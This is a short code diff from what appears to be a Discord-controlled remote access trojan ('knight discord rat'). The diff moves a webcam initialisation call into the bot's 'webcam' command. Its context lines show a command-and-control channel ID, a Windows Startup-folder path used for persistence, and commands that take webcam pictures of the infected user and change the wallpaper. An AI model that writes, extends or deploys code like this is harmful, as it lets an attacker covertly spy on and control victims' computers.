@@ -27,7 +27,6 @@ channelid = cc.get_knight_discord_rat_channel_id() ### OPTIONAL | ONLY SET IF YO
 
 ### DEV CONFIG
 
-pygame.camera.init()
 dscrd = 'https://discord.gg/rHdqqqYVzY'
 roaming = os.getenv("appdata")
 startup_loc = os.path.join(roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
@@ -348,6 +347,7 @@ async def wallpaper(ctx, inputid, rawimg):
         
 @bot.command(name='webcam')
 async def webcam(ctx, inputid):
+    pygame.camera.init()
     if inputid == clientid:
         camlist = pygame.camera.list_cameras()
         fname = str(f'webcampicture_{clientid}.png')
